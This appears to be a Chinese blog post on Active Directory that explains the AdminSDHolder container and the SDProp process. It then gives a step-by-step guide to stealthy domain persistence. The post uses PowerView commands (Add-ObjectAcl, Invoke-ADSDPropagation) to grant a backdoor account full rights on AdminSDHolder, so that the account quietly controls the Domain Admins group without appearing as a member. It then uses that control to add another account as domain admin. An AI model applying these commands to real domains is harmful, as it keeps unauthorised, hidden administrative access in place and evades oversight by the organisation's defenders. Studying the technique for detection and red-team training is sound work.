**目录**

[SDProp与AdminSDHolder](#t0 "SDProp与AdminSDHolder")

[利用AdminSDHolder和SDProp实现隐蔽的权限维持](#t1 "利用AdminSDHolder和SDProp实现隐蔽的权限维持 ") 

* * *

SDProp与AdminSDHolder
--------------------

受保护对象（通常是一些特权内置账号如Domain Admins、Enterprise Admins等）被系统安全策略保护，以避免这些特权对象被恶意修改或滥用（防止被删除、修改权限等）。每一个被保护的对象由SDProp进程（Security Descriptor Propagation）监控保护，SDProp进程每60分钟运行一次，运行时检查受保护对象的安全描述符，检查将依照AdminSDHolder容器的ACL，如果受保护对象的ACL配置与AdminSDHolder容器的ACL配置不一致，SDProp进程将重写该受保护对象的ACL，使其恢复与AdminSDHolder容器相同的ACL配置。

AdminSDHolder位于AD的System下，distinguishedName(可分辨名称)为：CN=AdminSDHolder,CN=System,DC=xie,DC=com，可以理解为AdminSDHolder的ACL配置是一个安全的配置模板。

![](https://img-blog.csdnimg.cn/20210218110300528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**AdminCount属性**

被SDProp进程保护的对象会将AdminCount属性设置为1，SDProp进程根据该属性识别哪些对象是受保护的。值得注意的是，当一个原本受保护的对象从受保护组中移除之后，AdminCount属性不会被重置（仍然保持原来的设置值）。

![](https://img-blog.csdnimg.cn/20210218110444561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

手动触发SDProp进程：通过LDAP修改fixupInheritance值为1（Windows 2008及后续版本修改runProtectAdminGroupsTask）来触发即时的SDProp进程运行。传送门：[Q. How can I force AdminSDHolder permissions to be enforced? | IT Pro](https://www.itprotoday.com/security/q-how-can-i-force-adminsdholder-permissions-be-enforced "Q. How can I force AdminSDHolder permissions to be enforced? | IT Pro")

AdminSDHolder默认保护的对象（Windows 2008/Windows 2008 R2）：

```
Account Operators，Administrator，Administrators，Backup Operators，Domain Admins，Domain Controllers，Enterprise Admins，Krbtgt，Print Operators，Read-only Domain Controllers，Replicator，Schema Admins，Server Operators
```


PowerSplit中的Powerview脚本提供了可以枚举AdminCount值为1的对象

```
Import-Module .\PowerView.ps1;Get-NetUser -Admincount      
Import-Module .\PowerView.ps1;Get-NetGroup -Admincount
```


![](https://img-blog.csdnimg.cn/20200714141330968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200714141353649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

利用AdminSDHolder和SDProp实现隐蔽的权限维持 
--------------------------------

已经拿到域管权限，利用域管权限，修改AdminSDHolder的ACL配置，这样当SDProp进程运行时以AdminSDHolder的ACL为模板进行受保护对象ACL配置检查时，将会把添加进去的配置同步到受保护对象的ACL中。

1.  将目标用户添加到AdminSDHolder对象的ACL中，使其拥有“完全控制”权限或“修改”权限，这一步操作需要域管权限；
2.  等待SDProp进程运行，SDProp运行之后，目标用户将成为域管理员组的成员，该用户可以修改域管理员组成员关系，意味着其可以将其他账号提升为域管理员（注意该用户并不属于域管理员组，直接查看该用户的memberof属性是没有域管组的，但是因为域管理员组的ACL中有一条对该用户的权限分配，因此其对域管组有权限）；
    

利用Powerview集成的函数可以实现上述攻击。

```
#为AdminSDHolder容器添加ACL，为用户hack分配完整权限。      
Add-ObjectAcl -TargetADSprefix "CN=AdminSDHolder, CN=System"  -PrincipalSamAccountName hack -Rights All      
#查询AdminSDHolder的ACL配置，确认hack用户已对AdminSDHolder具有权限      
Get-ObjectAcl -ResolveGUIDs -ADSprefix "CN=AdminSDHolder, CN=System" | ? {$_.identityReference -match "hack"}
```


![](https://img-blog.csdnimg.cn/20200714110230109.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

等待SDProp进程运行完成后(我们也可以使用Invoke-ADSDPropagation.ps1脚本触发SDProp的运行)

```
#使用Invoke-ADSDPropagation.ps1脚本触发SDProp运行      
Import-Module .\Invoke-ADSDPropagation.ps1;Invoke-ADSDPropagation -TaskName runProtectAdminGroupsTask       
#检查hack用户对域管理员组是否具有权限      
Get-ObjectAcl -ADSprefix "CN=Domain admins,CN=Users" -resolveguids | ? {$_.identityreference -match "hack"}      
#并且hack用户不在管理员组中      
net user hack /domain
```


![](https://img-blog.csdnimg.cn/20200714141935997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200714135545148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

以hack用户身份登录，将域用户hack2添加到域管理员组中 

```
#将test用户添加到域管理员组中。      
net group "domain admins" hack2 /add      
net group "domain admins"
```


![](https://img-blog.csdnimg.cn/20200714142056165.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)

参考文章：[域渗透中的ACL访问控制和组策略利用方法](https://www.freebuf.com/news/231037.html "域渗透中的ACL访问控制和组策略利用方法")